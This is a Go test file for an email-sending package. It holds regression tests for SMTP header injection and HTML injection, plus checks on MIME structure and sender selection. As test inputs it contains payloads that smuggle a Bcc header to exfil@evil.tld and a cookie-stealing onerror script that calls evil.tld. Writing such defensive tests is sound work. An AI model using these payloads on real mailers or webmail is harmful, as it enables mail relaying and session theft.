package email

import (
	"mime"
	"net/mail"
	"strings"
	"testing"
)

// This package had no tests, and it contains the two fixes for a CRITICAL
// class of bug in a system that sends email to other people:
//
//  1. SMTP header injection. `subject` can carry an owner-controlled business
//     name, and a name of "x\r\nBcc: exfil@evil.tld" injected a Bcc header on the
//     SMTP path — turning the transactional mailer into an open relay for the
//     attacker's address. `net/http` sanitises response headers; this is a raw
//     writer, so nothing else did.
//  2. HTML injection in the branded shell. A business named
//     `<img src=x onerror="...">` got that markup rendered inside the platform's
//     own branding in a recipient's webmail.
//
// Both fixes are one-liners, which is exactly why they need tests: a one-line
// fix that gets reverted in a refactor is invisible until it is exploited.

// TestHeaderValueStripsCRLF is the regression test for SMTP header injection.
//
// The assertion is on the PARSED message, not on the string, because a test that
// only checks "the output does not contain \r\n" would pass even if the message
// were malformed in a way that changes its meaning. net/mail parses the result
// and reports what a receiving MTA would actually see.
func TestHeaderValueStripsCRLF(t *testing.T) {
	cases := []struct {
		name  string
		input string
		want  string
	}{
		{"plain", "Cafe Senja", "Cafe Senja"},
		// Each of CR and LF becomes a space independently, so a CRLF pair
		// becomes TWO spaces. Asserting the exact output matters: it is what
		// pins the behaviour to "replace each character" rather than "collapse
		// runs", and a future "tidy this up" edit that collapsed runs would
		// still be safe but would change the subject text.
		{"CRLF injection with Bcc", "x\r\nBcc: exfil@evil.tld", "x  Bcc: exfil@evil.tld"},
		{"bare LF injection", "x\nBcc: exfil@evil.tld", "x Bcc: exfil@evil.tld"},
		{"CR only", "x\rBcc: exfil@evil.tld", "x Bcc: exfil@evil.tld"},
		{"multiple headers", "a\r\nBcc: v@x.tld\r\nCc: w@x.tld", "a  Bcc: v@x.tld  Cc: w@x.tld"},
		{"trailing CRLF", "name\r\n", "name  "},
		{"empty", "", ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := headerValue(c.input); got != c.want {
				t.Errorf("headerValue(%q) = %q, want %q", c.input, got, c.want)
			}
		})
	}
}

// TestBuildMessageCannotInjectHeaders parses the generated message and asserts
// that no extra recipient or header appeared.
//
// This is the end-to-end version: it exercises buildMessage, so it covers the
// `to` address and the extra-header map as well as the subject, which are all
// reachable from user input.
func TestBuildMessageCannotInjectHeaders(t *testing.T) {
	// The exact payload from the vulnerability: an owner-controlled business
	// name that tries to smuggle a Bcc.
	evilSubject := "You have been added\r\nBcc: exfil@evil.tld"
	evilTo := "victim@example.test\r\nBcc: exfil@evil.tld"

	raw := buildMessage("no-reply@bizverse.test", evilTo, evilSubject,
		"<p>hello</p>", bulkHeaders("https://bizverse.test"))

	msg, err := mail.ReadMessage(strings.NewReader(string(raw)))
	if err != nil {
		t.Fatalf("generated message does not parse as RFC 5322: %v\n---\n%s", err, raw)
	}

	// THE security property: no header line may be introduced. Checking the
	// parsed header map is not enough on its own, because a malformed injected
	// value can make the message unparseable in a way that fails CLOSED
	// (dropped) or, worse, that a lenient parser recovers from. So the assertion
	// is on the raw bytes: after the known-good header block, no line may begin
	// with a header name that the writer did not intend to emit.
	//
	// Note what actually happens to the injected To: it becomes
	// "victim@example.test Bcc: exfil@evil.tld", which is not a valid address
	// list, so `AddressList` rejects it. The injection is neutralised, and the
	// message is then rejected rather than delivered — fail-closed, which is the
	// right outcome. An earlier version of this test asserted the To header
	// WOULD parse and therefore failed; the test was wrong about the guarantee.
	// Scoped to the headers an attacker would actually want to ADD. Content-Type
	// is deliberately not in the list: buildMessage legitimately writes three of
	// them (the multipart declaration plus one per alternative part), so
	// flagging it would be flagging the writer's own correct behaviour.
	for _, line := range strings.Split(string(raw), "\r\n") {
		lower := strings.ToLower(line)
		for _, forbidden := range []string{"bcc:", "cc:", "reply-to:", "resent-", "return-path:", "sender:"} {
			if strings.HasPrefix(lower, forbidden) {
				t.Errorf("message contains an injected header line %q:\n%s", line, raw)
			}
		}
		// Exactly one From, and it is the configured one.
		if strings.HasPrefix(lower, "from:") && !strings.HasPrefix(lower, "from: no-reply@") {
			t.Errorf("message contains an unexpected From line %q:\n%s", line, raw)
		}
	}
	for name := range msg.Header {
		if strings.EqualFold(name, "Bcc") || strings.EqualFold(name, "Cc") {
			t.Fatalf("message gained a %s header via injection:\n%s", name, raw)
		}
	}

	// The address list must not contain the attacker's address under any
	// interpretation. A parse error is an acceptable outcome here — it means the
	// message is rejected rather than relayed — so it is asserted as "not
	// deliverable to the attacker" rather than "parses cleanly".
	addrs, aerr := msg.Header.AddressList("To")
	if aerr == nil {
		for _, a := range addrs {
			if strings.Contains(a.Address, "evil.tld") {
				t.Fatalf("the injected address is a real recipient: %s\n%s", a.Address, raw)
			}
		}
		if len(addrs) != 1 || addrs[0].Address != "victim@example.test" {
			t.Errorf("To = %v, want exactly victim@example.test", addrs)
		}
	}

	// The subject is a single folded value, not two headers.
	subject := msg.Header.Get("Subject")
	if strings.ContainsAny(subject, "\r\n") {
		t.Errorf("Subject still contains a line break: %q", subject)
	}
	if !strings.Contains(subject, "exfil@evil.tld") {
		t.Errorf("Subject = %q; the injected text should survive as inert subject text, not vanish", subject)
	}

	// And the List-Unsubscribe pair that marks bulk mail is present and intact,
	// so the sanitiser did not eat a legitimate header.
	if got := msg.Header.Get("List-Unsubscribe-Post"); got != "List-Unsubscribe=One-Click" {
		t.Errorf("List-Unsubscribe-Post = %q, want List-Unsubscribe=One-Click", got)
	}
}

// TestBuildMessageIsWellFormed guards the structural properties a receiving MTA
// needs. A message that fails to parse is silently dropped or, worse, delivered
// with a mangled body.
func TestBuildMessageIsWellFormed(t *testing.T) {
	raw := buildMessage("no-reply@bizverse.test", "user@example.test", "Hello",
		"<p>Hello <b>there</b></p>", nil)
	text := string(raw)

	msg, err := mail.ReadMessage(strings.NewReader(text))
	if err != nil {
		t.Fatalf("parse: %v\n---\n%s", err, text)
	}
	if got := msg.Header.Get("MIME-Version"); got != "1.0" {
		t.Errorf("MIME-Version = %q, want 1.0", got)
	}
	ct := msg.Header.Get("Content-Type")
	if !strings.HasPrefix(ct, "multipart/alternative") {
		t.Errorf("Content-Type = %q, want multipart/alternative", ct)
	}

	// The boundary must be parseable, which is the thing a hand-written
	// multipart writer most often gets wrong.
	_, params, err := mime.ParseMediaType(ct)
	if err != nil {
		t.Fatalf("Content-Type does not parse: %v", err)
	}
	boundary, ok := params["boundary"]
	if !ok || boundary == "" {
		t.Fatal("no boundary parameter; the two parts cannot be separated")
	}
	if !strings.Contains(text, "--"+boundary) {
		t.Errorf("declared boundary %q does not appear in the body", boundary)
	}
	if !strings.HasSuffix(strings.TrimRight(text, "\r\n"), "--"+boundary+"--") {
		t.Error("message does not end with the closing boundary delimiter")
	}
	// Both alternatives must be present, or a client picks one at random.
	if !strings.Contains(text, "text/plain") || !strings.Contains(text, "text/html") {
		t.Error("both a text/plain and a text/html part are required")
	}
}

// TestMimeBoundaryIsUniqueAndSafe checks the random delimiter. A predictable or
// colliding boundary lets message content forge a part boundary, and a weak
// entropy source is how that happens.
func TestMimeBoundaryIsUniqueAndSafe(t *testing.T) {
	seen := make(map[string]bool, 64)
	for i := 0; i < 64; i++ {
		b := mimeBoundary()
		if seen[b] {
			t.Fatalf("boundary repeated after %d draws: %q", i, b)
		}
		seen[b] = true
		// Only characters that are legal unquoted in a MIME boundary parameter.
		for _, r := range b {
			ok := r == '-' || (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9')
			if !ok {
				t.Fatalf("boundary %q contains %q, which needs quoting and risks a parse difference", b, r)
			}
		}
	}
}

// TestWrapHTMLEscapesTitleAndURL is the regression test for HTML injection into
// the branded shell.
//
// The asymmetry is deliberate and is the thing to get right: `title` and
// `publicURL` are escaped, `bodyHTML` is not, because callers already escape
// their own interpolations and double-escaping would show raw entities to the
// user. So this asserts both halves — that the title is escaped AND that a
// pre-escaped body is left alone.
func TestWrapHTMLEscapesTitleAndURL(t *testing.T) {
	const payload = `<img src=x onerror="fetch('https://evil.tld/?c='+document.cookie)">`

	got := WrapHTML("https://bizverse.test", payload, "<p>safe body</p>")

	if strings.Contains(got, "<img src=x") {
		t.Error("the title was not escaped; attacker-controlled markup reaches the recipient's webmail")
	}
	if !strings.Contains(got, "&lt;img") {
		t.Errorf("expected the title to appear HTML-escaped; got:\n%s", got)
	}
	// The body is passed through untouched.
	if !strings.Contains(got, "<p>safe body</p>") {
		t.Error("bodyHTML must be passed through unchanged; callers escape their own interpolations")
	}

	// publicURL is escaped too, since it is configuration that can be wrong in
	// a way nobody reviews.
	bad := WrapHTML(`https://x.tld" onmouseover="alert(1)`, "Title", "<p>b</p>")
	if strings.Contains(bad, `onmouseover="alert(1)"`) {
		t.Error("publicURL was not escaped; a misconfigured value becomes a handler in every email")
	}
}

// TestStripTagsProducesReadablePlaintext checks the text/plain alternative. It
// is a nicety, not a security boundary, but a broken one makes the console
// sender unreadable in development, which is where email bugs get noticed.
func TestStripTagsProducesReadablePlaintext(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"<p>Hello</p>", "Hello"},
		{"<a href=\"https://x.tld\">Link</a>", "Link"},
		{"<p>a</p><p>b</p>", "ab"},
		{"plain text", "plain text"},
		{"", ""},
	}
	for _, c := range cases {
		if got := stripTags(c.in); got != c.want {
			t.Errorf("stripTags(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// TestNewSenderSelection pins the driver precedence, because the fallback is a
// security property: the last resort writes the full message — including raw
// password-reset tokens — to stdout. config.Validate refuses to boot in prod
// without a real sender for exactly this reason, and this test documents which
// configurations would have used it.
func TestNewSenderSelection(t *testing.T) {
	cases := []struct {
		name string
		cfg  ResendConfig
		want string
	}{
		{"nothing configured logs to the console", ResendConfig{AppEnv: "dev"}, "*email.logSender"},
		{"SMTP is used when there is no API key", ResendConfig{AppEnv: "prod", SMTPAddr: "localhost:1025"}, "*email.smtpSender"},
		// The dev carve-out is the point: local work must be able to hit Mailpit
		// without a real Resend key, and it must not try to send real mail
		// because a key happens to be in the environment.
		{"an API key is ignored in dev, so Mailpit still receives mail", ResendConfig{AppEnv: "dev", APIKey: "k", SMTPAddr: "localhost:1025"}, "*email.smtpSender"},
		{"an API key is used outside dev", ResendConfig{AppEnv: "prod", APIKey: "k"}, "*email.resendSender"},
		// With only an API key in dev there is no SMTP target, so the console
		// fallback applies. config.Validate refuses to boot prod in this state,
		// which is what stops it printing password-reset tokens to stdout.
		{"a dev API key with no SMTP target still logs locally", ResendConfig{AppEnv: "dev", APIKey: "k"}, "*email.logSender"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := typeName(NewSender(c.cfg))
			if got != c.want {
				t.Errorf("NewSender(%+v) = %s, want %s", c.cfg, got, c.want)
			}
		})
	}
}

func typeName(v any) string {
	switch v.(type) {
	case *resendSender:
		return "*email.resendSender"
	case *smtpSender:
		return "*email.smtpSender"
	case *logSender:
		return "*email.logSender"
	default:
		return "unknown"
	}
}
